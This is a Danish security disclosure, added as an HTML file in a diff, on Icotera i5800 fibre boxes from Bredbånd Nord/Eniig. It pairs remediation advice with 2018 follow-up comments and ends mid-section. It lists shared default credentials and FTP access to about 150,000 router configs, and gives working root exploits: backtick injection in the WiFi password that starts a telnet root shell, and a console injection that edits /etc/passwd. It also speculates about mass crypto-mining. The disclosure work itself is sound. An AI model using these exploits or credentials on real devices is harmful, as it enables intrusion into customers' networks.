@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+
+<html lang="da" dir="ltr" class="client-js"><head>
+<title>Sikkerhedsproblemer i Icotera i5800 fiberboks fra Bredbånd Nord</title>
+<meta charset="UTF-8">
+<style type="text/css">
+body
+{
+ max-width: 60em;
+ margin: 0 auto;
+}
+
+pre
+{
+ font-size: 12.8px;
+ background-color: #000;
+ color: #ccc;
+ white-space: pre-wrap;
+ padding: 3px;
+}
+
+table
+{
+ border-collapse: collapse;
+}
+
+table td, table th
+{
+ text-align: left;
+ padding: 1px 10px;
+ border-bottom: 1px solid #000;
+}
+
+table tr:first-child
+{
+ border-top: 1px solid #000;
+}
+
+table th
+{
+ background-color: #ccc;
+ font-weight: bold;
+}
+
+table  tr:nth-child(even)
+{
+ background-color: #fff;
+}
+
+table  tr:nth-child(odd)
+{
+ background-color: #eee;
+}
+
+u
+{
+ color: red;
+ text-decoration: none;
+}
+
+.comment
+{
+ background-color: #cceffa;
+}
+
+.comment .wikitable th
+{
+ background-color: #a3c6d1;
+}
+
+.comment .wikitable  tr:nth-child(even)
+{
+ background-color: #cceffa;
+}
+
+.comment .wikitable  tr:nth-child(odd)
+{
+ background-color: #bee1ec;
+}
+</style>
+</head>
+
+<body>
+<h1>Sikkerhedsproblemer i Icotera i5800 fiberboks fra Bredb&aring;nd Nord</h1>
+
+<div class="comment">
+<p>Bredbånd Nord (nu Eniig Fiber) modtog i september 2017 dette 
+dokument. Kommentarer er indsat i august/september 2018, med blå 
+baggrund.
+</p><p>Mange konklusioner er lavet ud af få målinger, som antager at alt er ens. Bredbånd Nord have 8 forskellige fiberbokse i 2017.
+</p><p>Koder, IP-adresser og andet er ændret for at undgå misbrug (for en sikkerhedskyld, det burde ikke være nødvendigt).
+</p>
+</div>
+
+<h2><span id="Brugernavn.2Fkodeords_oversigt">Brugernavn/kodeords oversigt</span></h2>
+<p>Eksempel data:
+</p>
+<ul><li>Kundenummer: 5963574 (7 tal, fortløbende)</li>
+<li>Kundekodeord: cuopeijuiy (10 tilfældige bogstaver)</li>
+<li>Alle andre brugernavne og kodeord er de samme på alle fiberbokse</li></ul>
+<table class="wikitable">
+<tbody><tr>
+<th>
+</th>
+<th>Brugernavn/SSID
+</th>
+<th>Kodeord
+</th>
+<th>Kan ændres af kunden
+</th>
+<th>Kan tilgås fra
+</th></tr>
+<tr>
+<td>Mit Bredbånd Nord
+</td>
+<td>5963574 eller email
+</td>
+<td>cuopeijuiy
+</td>
+<td>Nej
+</td>
+<td>Internettet
+</td></tr>
+<tr>
+<td>WiFi
+</td>
+<td>5963574
+</td>
+<td>cuopeijuiy
+</td>
+<td>Ja
+</td>
+<td>100m fra fiberboks
+</td></tr>
+<tr>
+<td>Fiberbokses webinterface
+</td>
+<td>admin<br>operator
+</td>
+<td>admin<br>operatorpass
+</td>
+<td>Ja<br>Nej
+</td>
+<td>Routermode: MGMT, LAN<br>Bridgemode: MGMT, VOIP
+</td></tr>
+<tr>
+<td>Fiberbokses konsol
+</td>
+<td>admin
+</td>
+<td>123
+</td>
+<td>Nej
+</td>
+<td>MGMT, seriel port
+</td></tr>
+<tr>
+<td>FTP server med fiberboks setup
+</td>
+<td>voip
+</td>
+<td>voip15739
+</td>
+<td>Nej
+</td>
+<td>VOIP (skriveadgang)
+</td></tr>
+</tbody></table>
+<div class="comment">
+<p>Koden til GPON er 1234567890 på alle fiberbokse. Dette blev nævnt i en email senere.
+</p>
+</div>
+<h2><span id="S.C3.A5rbarhedsoversigt">Sårbarhedsoversigt</span></h2>
+<h3><span id="Mit_Bredb.C3.A5nd_Nord:_Opret_bruger">Mit Bredbånd Nord: Opret bruger</span></h3>
+<p>For at oprette en bruger på selvbetjeningsportalen "Mit Bredbånd 
+Nord" tilknyttes et kundenummer til en e-mail adresse. Hvis ikke 
+kundenummeret har tilknyttet en e-mail adresse, kan dette gøres af 
+enhver på Bredbånd Nords selvbetjeningsportal. Da kundenummeret også 
+bliver benyttet som WiFi-SSID, er disse oplysninger offentligt 
+tilgængelige. Herefter får man tilsendt kodeordet pr. mail, der kan 
+bruges til "Mit Bredbånd Nord" og WiFi. Det er altså muligt at tilegne 
+sig login oplysninger til naboens eller andet tilgængeligt WiFi, hvis de
+ aldrig har benyttet selvbetjeningsportalen. Ofte er denne ikke 
+benyttet, da nødvendige informationer som WiFi password og kundenummmer 
+også modtages med udstyret fra Bredbånd Nord.
+</p>
+<h3><span id="Mit_Bredb.C3.A5nd_Nord:_Genbrugt_kodeord">Mit Bredbånd Nord: Genbrugt kodeord</span></h3>
+<p>Da samme kodeord bruges til "Mit Bredbånd Nord" og WiFi. Vil enhver 
+der har fået kodeordet til WiFi kunne gå ind på "Mit Bredbånd Nord" og 
+ændre hastighed og TV pakke. Så børnene i hustanden kan ændre disse 
+ting, såfremt man ikke har skiftet kodeordet til WiFi, inden man gav dem
+ det.
+</p>
+<h3><span id="Default_kode_p.C3.A5_fiberbokses_webinterface">Default kode på fiberbokses webinterface</span></h3>
+<p>Enhver der har adgang til LAN'et, kan ændre i fiberboksens 
+konfiguration. For eksempel kan DNS-serverne ændres og dermed overvåge 
+og kontrollere trafik. Selvom kunden ændrer passwordet på fiberboksen, 
+er det stadig muligt at logge ind med operatør koden.
+</p>
+<h3><span id="SSH_og_webinterface">SSH og webinterface</span></h3>
+<p>Ved at route trafik ud igennem MGMT interfacet kan andre fiberbokse 
+tilgås igennem SSH og webinterface. Koderne til WiFi og webinterfacet 
+kan derefter læses, også selvom kunden har ændret dem. Hvis de ændrede 
+koder er genbrugt på andre enheder, kan de misbruges yderligere. For 
+eksempel hvis samme kode også benyttes til andre enheder i husstanden, 
+eksempelvis WiFi/webinterfacet, IP-kamara mm.
+</p>
+<div class="comment">
+<p>Det at muligt at eksikvere kommandoer som root ved at indsætte 5Ghz 
+WiFi koden som en `kommando` (altså man indsætter [`]-tegnet før og 
+efter en selvvalgt kommando). Dette kan gøres både igennem web, SSH og 
+konsol. Denne fejl blev ikke nævnt i dokumentet, da det ville gøre det 
+for nemt at udnytte fejlene skulle dokumentet falde i de forkerte 
+hænder, og for at var nemt at holde øje med om hullerne blev lukket, og 
+ikke kun skjult. Fejlen blev rapporteret til Icotera i maj 2018. Icotera
+ havde førsøgt at forhindre sådan en fejl, ved at lave en liste over 
+ikke tilladte tegn. Men i denne liste var [´] forbudt i stedet for [`].
+</p>
+<pre>Tilladte:&nbsp;!"#$&amp;/=?`+[]*,.:-_@ mellemrum, tal, store og små bogstaver
+Forbudte: ¤½§()´|{}^~¨'&lt;&gt;\;£
+</pre>
+<p>Kommandoen bliver eksekveret fordi at i filen /tmp/scripts/wlan_script bliver denne kommando kørt:
+</p>
+<pre>iwpriv wlan0 set_mib ssid=$'"wifinavnsatafbrugeren"' <u># Beskyttet i mod shell-injection</u>
+iwpriv wlan0 set_mib passphrase=wifikodesatafbrugeren <u># Shell-injection mulig</u>
+</pre>
+<p>Der er en lignende fejl i fiberbokse fra Alcatel. Men det er ikke 
+undersøgt nærmere. En nem måde at teste for sådanne fejl, er at forsøge 
+at kører denne kommando: "ping 192.168.0.2 -c 7", og se om man modtager 7
+ ping pakker på ens PC. Man skal selvfølgelig indsætte sin egen 
+ip-adressen i kommandoen. Man kan forsøge at eksikvere kommandoen ved at
+ indsætte den i alle inputfelter på webinterfacet. Typiske tegn man kan 
+sætte før og efter  kommandoen er: [`"';]. Man kan også forsøge 
+$(kommando).
+</p>
+</div>
+<h3><span id="FTP-server_med_fiberboks_setup">FTP-server med fiberboks setup</span></h3>
+<p>Ved at route LAN traffik ud igennem VOIP interfacet, kan andres 
+fiberbokses konfigurationer tilgås på FTP-serveren, hvor de hentes fra 
+under opstart. De indholder koden til WiFi og dermed "Mit Bredbånd 
+Nord". Kontoen har læse- og skrive-rettigheder som en almindelig Linux 
+bruger. Hele serveren er eksponeret igennem FTP. Man kan derfor ændre 
+konfigurationsfilerne for alle fiberbokse, og se hvordan serveren der 
+driver FTP servicen er sat op.
+</p>
+<div class="comment">
+<h3><span id="F.C3.A6lles_GPON_kode">Fælles GPON kode</span></h3>
+<p>Når en fiberboks logger på GPON-netværket bruges serienummeret som 
+brugernavn og koden 1234567890. Da serienummerene for fortløbende, er 
+det muligt at gætte sig frem til et. Det er også nødvendigt at kende 
+fiberboksens MAC-adresse. Denne bliver send ud via WiFi. Det er således 
+muligt at overtage naboens internet-forbindelse. Dette er ikke testet, 
+da der er risiko for driftsforstyrelser ved at gøre det. 
+</p>
+</div>
+<h2><span id="Data_og_systemer_der_kan_komprimtieres">Data og systemer der kan komprimtieres</span></h2>
+<ul><li>Fiberboks
+<ul><li> MAC-adresse</li>
+<li> Serienummer</li>
+<li> TR-069 kode</li>
+<li> Kundenummer</li>
+<li> WiFi kode</li>
+<li> Kundens egen kode til WiFi</li>
+<li> Kundens egen kode til webinterface</li>
+<li> DNS-server i fiberboks</li>
+<li> SSH host keys</li>
+<li> Firmware</li></ul></li>
+<li>Mit Bredbånd Nord
+<ul><li> Navn</li>
+<li> Adresse</li>
+<li> Telefon</li>
+<li> Mobil</li>
+<li> Email</li>
+<li> Web TV Token</li>
+<li> Valg af abonnement</li>
+<li> "Anden betaler"</li>
+<li> "Anden postadresse"</li></ul></li>
+<li>Kundens LAN og internet-forbindelse
+<ul><li> Alt ukrypteret traffik</li>
+<li> Alt krypteret traffik der er sårbar for "man in the middle" angreb, så som SSLstrip.</li>
+<li> Alle DNS opslag</li>
+<li> Alt beskyttet af dårlige/ingen kode, eller samme kode som til WiFi/route</li>
+<li> Alt med sikkerhedshuller.</li></ul></li>
+<li> Fastnet-telefon</li></ul>
+<p>Kun fantasien sætter grænser for hvordan man kan udnytte sårbarhedserne...
+</p>
+<div class="comment">
+<p>Det mest oplagte er at bruge de 150.000 fiberbokse til at lave 
+kryptovaluta. Hvis man antager at en boks kan generer 1 krone om dagen. 
+Bliver det til 270 millioner kroner på 5 år. Ved at kombinere 
+sikkerhedshullerne kan det gøres helt anonymt. Beløbet er sandsynligvis 
+10-100 gange mindre, men det er jo stadig ganske højt.
+</p><p>Det er også en mulighed at lægge internettet ned i hele Danmark, eller lave målrettet spionage.
+</p>
+</div>
+<h2><span id="L.C3.B8sningsforslag">Løsningsforslag</span></h2>
+<table class="wikitable">
+<tbody><tr>
+<th>
+</th>
+<th>Brugernavn/SSID
+</th>
+<th>Kodeord
+</th>
+<th>Kan ændres af kunden
+</th>
+<th>Kan tilgås fra
+</th></tr>
+<tr>
+<td>Mit Bredbånd Nord
+</td>
+<td>5963574 eller email
+</td>
+<td><u>vuisnrfh</u>
+</td>
+<td><u>Ja</u>
+</td>
+<td>Internettet
+</td></tr>
+<tr>
+<td>WiFi
+</td>
+<td><u>bbn-oixnfuvd</u>
+</td>
+<td><u>osmcydhycj</u>
+</td>
+<td>Ja
+</td>
+<td>100m fra fiberboks
+</td></tr>
+<tr>
+<td>Fiberbokses webinterface
+</td>
+<td>admin<br>operator
+</td>
+<td><u>kseucnstf</u><br><u>ofnvusht</u>
+</td>
+<td>Ja<br>Nej
+</td>
+<td>Routermode: LAN, <u>MGMT (kun bestemt IP)</u><br>Bridgemode: <u>MGMT (kun bestemt IP)</u>
+</td></tr>
+<tr>
+<td>Fiberbokses konsol
+</td>
+<td>admin
+</td>
+<td><u>ofnvusht</u>
+</td>
+<td>Nej
+</td>
+<td><u>MGMT (kun bestemt IP)</u>
+</td></tr>
+<tr>
+<td>FTP server med fiberboks setup
+</td>
+<td>voip
+</td>
+<td>voip15739
+</td>
+<td>Nej
+</td>
+<td><u>VOIP (læseadgang)</u>
+</td></tr>
+</tbody></table>
+<div class="comment">
+<p><b>Resultat:</b> <u>(Ændringer med rød tekst)</u>
+</p>
+<table class="wikitable">
+<tbody><tr>
+<th>
+</th>
+<th>Brugernavn/SSID
+</th>
+<th>Kodeord
+</th>
+<th>Kan ændres af kunden
+</th>
+<th>Kan tilgås fra
+</th></tr>
+<tr>
+<td>Mit Eniig
+</td>
+<td>[kundenummer]<br>[kundes email adresse]
+</td>
+<td>[internetkode]<br><u>[selvvalgt kode]</u>
+</td>
+<td>Nej<br><u>Ja</u>
+</td>
+<td>Internettet
+</td></tr>
+<tr>
+<td>WiFi
+</td>
+<td>[kundenummer]
+</td>
+<td>[internetkode]
+</td>
+<td>Ja
+</td>
+<td>100m fra fiberboks
+</td></tr>
+<tr>
+<td>Fiberbokses webinterface
+</td>
+<td>admin<br>operator
+</td>
+<td>admin<br>operatorpass
+</td>
+<td>Ja<br>Nej
+</td>
+<td>MGMT, LAN
+</td></tr>
+<tr>
+<td>Fiberbokses konsol
+</td>
+<td><u>eniigadmin</u>
+</td>
+<td><u>[ukendt, samme på alle bokse]</u>
+</td>
+<td>Nej
+</td>
+<td>MGMT, <u><s>seriel port</s></u>
+</td></tr>
+<tr>
+<td>FTP server med fiberboks setup
+</td>
+<td>[forskelling per PON]
+</td>
+<td>[forskelling per PON]
+</td>
+<td>Nej
+</td>
+<td>VOIP <u>(kun læse-adgang, ingen directory-listing, tilfældige filnavne)</u>
+</td></tr>
+<tr>
+<td>GPON
+</td>
+<td>[Boks serie nummer]
+</td>
+<td>1234567890
+</td>
+<td>Nej
+</td>
+<td>Hustande med fiber og ved gravsten
+</td></tr></tbody></table>
+</div>
+<p><b>Velkomstbrev:</b> Når man får sin internetforbindelse skal man 
+modtage et brev med koder til WiFi, webinterface og "Mit Bredbånd Nord".
+ Det skal ikke være muligt at få disse oplysning ved at kende adresse og
+ kundenummer.
+</p>
+<div class="comment">
+<p>"Mit Bredbånd Nord" er nu lukket, og erstattet med "Mit Eniig". Det 
+er nu ikke længere muligt at få WiFi koden igennem en hjemmeside ved at 
+kun at kende adresse og kundenummer (SSID). Men er det muligt at gører 
+det igennem telefonsupport ved at kun at oplyse adresse.
+</p>
+</div>
+<p><b>Mit Bredbånd Nord:</b> Det skal være muligt at skifte kodeordet, og det skal ikke være det samme som til WiFi.
+</p>
+<div class="comment">
+<p>Når man opretter en konto på "Mit Eniig" sætter man sin egen kode og 
+bruger sin email som brugernavn. Det er stadig muligt at loggeind med 
+kundenummer (SSID) og WiFi kode bagefter.
+</p>
+</div>
+<p><b>WiFi navn:</b> Det skal ikke være det samme som kundenummeret. Det skal være unikt.
+</p>
+<div class="comment">
+<p>Dette er ikke ændret. Hvis man kun ændre en af tingene, er det 
+vigtigste at ændre kundenummeret, da det er blevet offentliggjort ved at
+ blive sendt ud som SSID.
+</p>
+</div>
+<p><b>WiFi kodeord:</b> Det skal ikke være det samme som til "Mit Bredbånd Nord".
+</p>
+<div class="comment">
+<p>Kan stadig bruges til at oprettet en konto på "Mit Eniig".
+</p>
+</div>
+<p><b>Operator til SSH og webinterface:</b> Et tilfældig password per 
+fiberboks, således at det ikke er muligt at fiske password ud af ens 
+egen fiberboks, og bruge det på andres.
+</p>
+<div class="comment">
+<p>Koden til SSH er skiftet, men den er ens alle fiberbokse. Det er 
+derfor muligt at få koden til alle fiberbokse, ved at modificer 
+SSH-demonen til at gemme koden under login, og lokke en 
+systemadministrator til at logge ind.
+</p><p>Koderne admin:admin og operator:operatorpass er ikke skiftet på webinterfacet.
+</p>
+</div>
+<p><b>FTP server:</b>
+</p>
+<ul><li> Fjern skrive-adgang og directory listing.</li>
+<li> Opret hver konfiguration under et langt tilfældigt navn. Så man ikke kan gætte sig frem til navnet på andre konfigurationer.</li>
+<li> Begræns adgangen til kun /home/voip/.</li></ul>
+<p>Overvej en TFTP server, da den er bedre egnet til formålet.
+</p>
+<div class="comment">
+<p>Der er nu blevet lavet flere FTP-konti, der kun har adgang til en 
+delmægte af konfigurationen. Directory listing og skrive-adgang er 
+fjernet. konfigurationsfilerne har lange tilfældige navne. Logfilen 
+bliver overvåget.
+</p>
+</div>
+<p><b>Firewalls:</b> på MGMT og VOIP nettene skal trafik i mellem 
+fiberbokse på samme net blokeres, f .eks. med private VLAN. Routeren for
+ MGMT og VOIP nettene skal som udgangspunkt blokere udgånede forbindelse
+ fra fiberbokse. På fiberboksen skal SSH og webinterfaces kun kunne 
+tilgås fra bestemte IP'er.
+</p>
+<div class="comment">
+<p>Trafik på samme net bliver stadig ikke blokeret. Trafik til andre 
+nets skal igennem en positivs liste for tilladt trafik. På denne liste 
+har man glemt at tillade NTP serveren, og tiden passer derfor ikke 
+længere på fiberboksene. Fiberboksens firewall tillade nu kun trafik for
+ bestemte IP'er. Der er dog en konfigutionsfejl der gør at port 80 er 
+åben for alle hvis fiberboksen er sat i bridge mode. Det blive dog 
+reddet af et når fiberboksen kører i bridge, så kører webinterfacet 
+ikke.
+</p>
+</div>
+<p><b>Logning:</b> Fiberboksen understøtter at sende logs til en 
+syslog-server. Slå det til, så man kan se om der bliver logget ind på 
+fiberboksenes konsol.
+</p>
+<pre><u># Eksempel på syslog:</u>
+Jan  3 09:57:44 i5800 auth.info login[332]: root login on 'ttyS0'   <u># Login via seriel port</u>
+Jan  3 11:08:37 i5800 authpriv.notice dropbear[763]: Password auth succeeded for 'admin' from 10.232.3.104:9736   <u># Login via SSH</u>
+</pre>
+<div class="comment">
+<p>Logning er ikke blevet slået til. Loggen er meget omfatteene, og 
+indeholde blandt andet hvornår de enkle enheder forbinder, og deres 
+hostnavne.
+</p>
+</div>
+<p><b>Oprydning:</b>
+</p>
+<ul><li> Kode til WiFi og "Mit bredbånd Nord" skal skiftes.</li>
+<li> TR-069 koden skal skiftes.</li>
+<li> Kunder der har ændret koden til WiFi eller webinterfacet skal 
+opfordres til at skiftes dem, og alle de steder de har brugt samme 
+koder.</li>
+<li> Frisk firmware på fiberbokse installeres.</li></ul>
+<div class="comment">
+<p>Ingen form for oprydning eller udmelding foretaget. Man satser på at 
+ingen har udnyttet hullerne. Der er logfiler for FTP-serveren, som var 
+det sværeste sikkerhedshul at finde. Men derudover er at ikke sikkert at
+ Eniig har logs der kan vise om hullerne er udnytter eller ej. Er der 
+for eksempel logs over når en supporter har udleveret en kode per 
+telefon?
+</p>
+</div>
+<h2><span id="Dokumentation">Dokumentation</span></h2>
+<p>I fiberboksen er der 2 telefonstik. Nummer 2 fungere også som seriel 
+port, og tillader dermed at man kan logge ind på en fiberboks man har 
+fysik adgang til. Det er i sig selv ikke et problem. Andre ISP'er 
+tillader at man kan SSH til routeren de udlevere.
+</p>
+<h3><span id="Fiberboksens_netv.C3.A6rk_interfaces">Fiberboksens netværk interfaces</span></h3>
+<pre>&gt;show interface wan
+
+ -----------------------------------------------------------------
+ Name                 Oper  IP type  Address             VLAN
+ -------------------- ----- -------- ------------------- ---------
+ MGMT (M)             up    DHCP     172.23.14.217/21    51
+ Internet             up    DHCP     100.91.213.132/20   13   <u># VLAN12 hvis global IP tilkøbt</u>
+ VOIP                 up    DHCP     172.31.13.212/21    71
+
+
+&gt;show bridge brief
+
+ ----------------------------------------------------------------
+ Name                 Config   Oper  IP type  Address
+ -------------------- -------- ----- -------- -------------------
+ br3                  enable   up    DHCPD    192.168.0.1/24
+</pre>
+<h3><span id="Fiberboksens_konfiguration">Fiberboksens konfiguration</span></h3>
+<p>Herunder vises dele af konfigurationen fiberboksen kommer med.
+</p>
+<pre>interface wifi 1 ap 1 ssid 5963574   <u># Kundenummer</u>
+interface wifi 1 ap 1 enckey wpa2 cuopeijuiy   <u># Kundekodeord</u>
+interface wifi 2 ap 1 ssid 5963574_5GHz   <u># Kundenummer</u>
+interface wifi 2 ap 1 enckey wpa2 cuopeijuiy   <u># Kundekodeord</u>
+management ssh listen management
+management ssh filter rule 1 inif any
+management ssh filter rule 1 srcip 0.0.0.0   <u># SSH kan tilgås af alle via MGMT interface</u>
+management ssh filter rule 1 action allow
+management syslog disable   <u># Syslog er slået fra</u>
+management cli username admin
+management cli password $1$aKaa.d9.$6IzZ0e8gYlTf8gvpMxmfa0   <u># SSH passswordet er 123</u>
+management webif customer username admin
+management webif customer password admin
+management webif operator username operator
+management webif operator password operatorpass
+management webif listen all
+management webif filter rule 1 description allow MGMT access
+management webif filter rule 1 inif MGMT
+management webif filter rule 1 srcip 0.0.0.0   <u># Webinterface kan tilgås af alle via MGMT interface</u>
+management webif filter rule 1 action allow
+management webif filter rule 2 description allow customer access
+management webif filter rule 2 inif br3   <u># Hvis fiberboksen er i bridgemode, eksistere "br3" ikke, og bliver til "any" i stedet for. Webinterface kan derfor også tilgås via VOIP interfacet</u>
+management webif filter rule 2 srcip 0.0.0.0
+management webif filter rule 2 action allow
+</pre>
+<h3><span id="Tilg.C3.A5_FTP_server_med_alle_fiberbokse_setups">Tilgå FTP server med alle fiberbokse setups</span></h3>
+<p>Find FTP password:
+</p>
+<pre>&gt; debug techsupport
+<u># Ikke alt indhold vist. Søg efter "OMCI Provisioning".</u>
+Jan  1 01:00:33 i5800 user.info syslog: OMCI Provisioning: Starting
+Jan  1 01:00:38 i5800 user.info syslog: OMCI Provisioning: Address: 89.249.14.88
+Jan  1 01:00:38 i5800 user.info syslog: OMCI Provisioning: ftp Configuration filename: /home/voip/gistr01pon02/gistr01_1-4-113-A.xml
+Jan  1 01:00:38 i5800 user.info syslog: OMCI Provisioning: ftp Username: voip
+Jan  1 01:00:38 i5800 user.info syslog: OMCI Provisioning: ftp Password: voip15739
+</pre>
+<p>Route traffik til FTP server igennem VOIP interface:
+</p>
+<pre>router addif wan 3
+router nat masquerade wan 3 enable
+router route 1 enable
+router route 1 destination 89.249.14.88
+router route 1 gateway 172.31.0.1    <u># Default gateway for VOIP interfacet</u>
+router route 1 interface wan 3
+
+copy progress boot
+</pre>
+<p>Hvis man er forbundet til fiberboksenes LAN kan <a rel="nofollow" class="external free" href="ftp://89.249.14.88/">ftp://voip:voip15739@89.249.14.88/</a> nu tilgås.
+</p>
+<pre>lftp -u voip,voip15739 -e 'find /home/voip/;bye' 89.249.14.88 | grep xml | wc -l
+151398  <u># Serveren indeholder konfigurationer for mere end 150.000 fiberbokse. Alle læse- og skrive-bare.</u>
+</pre>
+<p>Der er omkring 2500 konfigurationer for Gistrup. Hvilket kan passe 
+med at antenneforeningen har 1500 medlemmer og der er yderlig 1000 i 
+området.
+</p>
+<div class="comment">
+<h3><span id="Root_exploit_fra_konsollen">Root exploit fra konsollen</span></h3>
+<p>For at bliver root fra konsollen kør denne kommando:
+</p>
+<pre>gpon set logfile filename /tmp/log`sed "s/cliIcotera.//" -i /etc/passwd&amp;sleep 999`
+<u># Tryk CTRL-c bagefter</u>
+</pre>
+<p>Log ind igen, og du har en root-konsol.
+</p><p>Kommandoen virker fordi den ændrer shellen fra /bin/cliIcotera.sh til /bin/sh.
+</p>
+<h3><span id="Root_exploit_fra_webinterfacet">Root exploit fra webinterfacet</span></h3>
+<p>For at få en root terminal skal man sætte 5 Ghz WiFi koden til:
+</p>
+<pre>`/bin/nohup /bin/telnetd -l /bin/sh -p 59251 &amp;` <u># Start telnet.</u>
+`iptables -I INPUT -s 192.168.0.0/24 -j ACCEPT` <u># Tillad traffik.</u>
+<u># Sæt koden tilbage til det den var før.</u>
+</pre>
+<p>Telnet til routeren på port 59251.
+</p>
+</div>
+<h2><span id="Afsluttende_bem.C3.A6rkninger">Afsluttende bemærkninger</span></h2>
+<h3><span id="Disclaimer">Disclaimer</span></h3>
+<p>De omtalte sikkerhedproblemer er fundet i forbindelse med en 
+undersøgelse om hvordan fiberboksen virkede. Der er ikke blevet brugt 
+sikkerheds-skannings programmer. Der er kun blevet tilgået fiberbokse 
+efter aftale ejeren. En ondsindet person ville ikke havde de samme 
+begrænsninger, og ville måske finde flere sikkerhedshuller.
+</p>
+<h3><span id="Ros">Ros</span></h3>
+<ul><li> Det er ikke muligt at at få sin fiberboks til at få en andens 
+konfiguration ved at fake sin MAC-adresse. Da fiberboksender logger ind 
+med et individuelt brugernavn/kodeord for at kunne få URL'en til sin 
+konfiguration. <span class="comment">Hvor konfigurationen skal hentes 
+fra oplyses via TR069. TR069 i sig selv er sikker. Placering af 
+konfigurationen der henvises til var ikke.</span></li></ul>
+<ul><li> Koden til WiFi er nem at taste ind. Men koster 300.000 kroner at bruteforce. <span class="comment">Udviklingen går hurtig, hvis koden ændres bør den vær på 12 tegn, for at være fremtidssikret.</span></li></ul>
+<ul><li> Det er ikke muligt fra VOIP interfacet at SSH til FTP serveren på port 22. <span class="comment">Der var faktisk én firewall et sted.</span></li></ul>
+<h3><span id="Yderlig_l.C3.A6sning">Yderlig læsning</span></h3>
+<ul><li> <a rel="nofollow" class="external text" href="https://www.youtube.com/watch?v=h5PRvBpLuJs">Få konsol adgang til en dims</a></li>
+<li> <a rel="nofollow" class="external text" href="https://www.youtube.com/watch?v=C2N98HMrFKc">Sløset sikkerhed hos en ISP</a></li></ul>
+<div class="comment">
+<h2><span id="Forbedringsforslag_til_Eniig">Forbedringsforslag til Eniig</span></h2>
+<h3><span id="Afskaf_default_og_f.C3.A6lles_koder">Afskaf default og fælles koder</span></h3>
+<p><b>Problem:</b> Der er 4 koder på fiberboksene der er ens på dem 
+alle. Det er for: konsollen, GPON, og weinterfacets 2 konti: den til 
+kunden og den til support. Der er lige nu ikke fundet nogen alvorlige 
+huller ved dette, men det øger muligheden for at udnytte fremtidige 
+huller.
+</p><p><b>Løsning</b> Operator-kontoen til webinterfaces skal lukkes, 
+eller have en unik koden per fiberboks. Bruger-kontoen skal have en unik
+ koden per fiberboks. Det bør ikke være det samme som til WiFi, men det 
+er bedre at bruge den, end den samme på alle fiberbokse. Koderne til 
+GPON og konsol skal være forskellig per fiberboks.
+</p>
+<h3><span id="Verificer_konfiguration">Verificer konfiguration</span></h3>
+<p><b>Problem:</b> Der er forskel på den konfiguration fiberboksen henter, og hvad den kørerne konfiguration bliver til. 
+</p><p>For eksempel bliver disse kommandoer:
+</p>
+<pre>management webif operator enable
+management webif filter rule 2 inif br3
+</pre>
+<p>Til denne konfiguration:
+</p>
+<pre>management webif operator enable
+management webif operator username operator
+management webif operator password operatorpass
+management webif filter rule 2 inif any <u># Hvis br3 ikke eksistere</u>
+</pre>
+<p><b>Løsning:</b> Før automatisk kontrol med at den kørerne konfiguration bliver til det forventede.
+</p>
+<h3><span id="Hent_konfiguration_via_HTTPS">Hent konfiguration via HTTPS</span></h3>
+<p><b>Problem:</b> Det er muligt at aflyttet FTP URL'en til 
+konfigurationen, ved at bryde fysik ind i GPON netværket, for eksempel 
+ved en gravsten. Fordi fiberboksens konfiguration hentes via FTP som er 
+en ukrypteret protokol og upload trafik over GPON er ukrypteret (fra 
+husstand til central). Med FTP URL'en i hånden kan man hente offers 
+konfiguration fra en anden fiberboks.
+</p><p><b>Løsning:</b> Hent konfigurationen over HTTPS, og aflås gravsten + installer alarm.
+</p>
+<h3><span id="Begr.C3.A6ns_adgang_til_koder">Begræns adgang til koder</span></h3>
+<p><b>Problem:</b> Det er nemt at udgive sig for en anden når man 
+snakker med supporten. Det er fordi at der er svært, hvis ikke umuligt 
+for en supporter for at verificer at hvem de snakker med. Specielt ikke 
+når alle kundenumre er offentliggjort som SSID'er 
+(trådløst-netværksnavn). Sikkerhed og god support er to modsætninger, en
+ supporter der siger nej, vi ikke få gode anmeldelser.
+</p><p><b>Løsning:</b> Det skal ikke være muligt for support at se koder
+ for WiFi, fiberboks eller selvbetjening. Det skal kun være muligt at 
+skifte dem. Når en kode, telefonnummer eller email skiftes, skal der 
+automatisk sendes en SMS og email til kunden. Hvis at er telefon/email 
+skiftes skal det selvfølgeligt sendes til den tidligere telefon/email.
+</p><p>På den måde er det ikke muligt for en supporter at give adgang 
+til en kundes LAN for en hacker eller sig selv, uden at kunden opdager 
+det.
+</p><p>Det skal selvfølgelig ikke være muligt for kunden/hackeren at få 
+en ny kode til selvbetjening, også se WiFi og fiberboksens koden fra 
+selvbetjening. Derfor skal det heller ikke være muligt at se disse koder
+ fra selvbetjening, det skal kun være muligt at ændre dem. Hvis login 
+til selvbetjening kun er muligt via NemID, er dette unødvendigt.
+</p>
+<h3><span id=".C3.85ben_adgang_til_NTP_server">Åben adgang til NTP server</span></h3>
+<p><b>Problem:</b> Routeren for fiberbokse blokere adgang til deres 
+NTP-server. Tiden passer derfor ikke på fiberboksene, og gør deres log 
+sværere at bruge.
+</p><p><b>Løsning:</b> Åben for traffilen. Det er godt at routeren har en positiv-liste over tilladt traffik, og har lukket for alt andet.
+</p>
+<h3><span id="WiFi-konsulent">WiFi-konsulent</span></h3>
+<p><b>Problem:</b> Kvalitet af det arbejde WiFi-konsulenten udføre kunne være bedre. Kun signal-styrken bliver målt.
+</p><p><b>Løsning:</b> Når WiFi-konsulenten skal finde den rigtige 
+placering for fiberboksen, skal det ske ved at måle faktisk through-put,
+ for eksempel med appen "Wi-Fi Sweetspot. Dørene skal være lukket imens.
+</p>
+<h3><span id="IPv6">IPv6</span></h3>
+<p><b>Problem:</b> Der er ingen IPv6.
+</p><p><b>Løsning:</b> Kom nu igang. Især når I bruger carrier grade NAT. Husk at lave DHCPv6 prefix delegation.
+</p>
+<h3><span id="Reverse_DNS">Reverse DNS</span></h3>
+<p><b>Problem:</b> Der er ingen reserve DNS for globale IP'er.
+</p><p><b>Løsning:</b> I det mindste er det ikke lavet forkert, da det 
+kan give sløvere internet. Men det kunne være rat med muligheden for at 
+selv at sætte sin reverse DNS på sin globale IP.
+</p>
+<h3><span id="MAC-adresse_for_global_IP">MAC-adresse for global IP</span></h3>
+<p><b>Problem:</b> Når man skifter imellem router og bridemode, skal man
+ venter på at DHCP reservation løber ud. Ved minder man er så snedig at 
+bruge den samme mac-adresse som fiberboksen.
+</p><p><b>Løsning:</b> DHCP reservation bør kunne styres fra selvbetjeningen, ligesom det er muligt for Stofa og Fullrate.
+</p>
+<h3><span id="Mange_fiberboks_modeller">Mange fiberboks modeller</span></h3>
